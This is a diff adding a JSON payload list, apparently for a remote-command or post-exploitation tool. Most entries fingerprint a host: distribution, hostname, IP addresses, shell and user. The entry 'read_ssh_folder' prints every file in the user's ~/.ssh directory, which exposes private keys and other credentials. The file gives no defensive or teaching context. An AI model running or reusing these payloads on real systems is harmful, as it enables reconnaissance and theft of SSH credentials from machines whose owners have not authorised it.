@@ -1,0 +1,32 @@
+[
+    {
+        "name": "get_dist",
+        "payload": "cat /etc/os-release | grep PRETTY_NAME",
+        "default_args": []
+    },
+    {
+        "name": "get_hostname",
+        "payload": "hostname",
+        "default_args": ["-s"]
+    },
+    {
+        "name": "get_ipaddr",
+        "payload": "hostname",
+        "default_args": ["-I"]
+    },
+    {
+        "name": "get_shell",
+        "payload": "echo $SHELL",
+        "default_args": []
+    },
+    {
+        "name": "read_ssh_folder",
+        "payload": "for file in $(find ~/.ssh/ -type f); do echo \"=== $file ===\"; cat \"$file\"; echo \"\"; done",
+        "default_args": []
+    },
+    {
+        "name": "get_user",
+        "payload": "whoami",
+        "default_args": []
+    }
+]
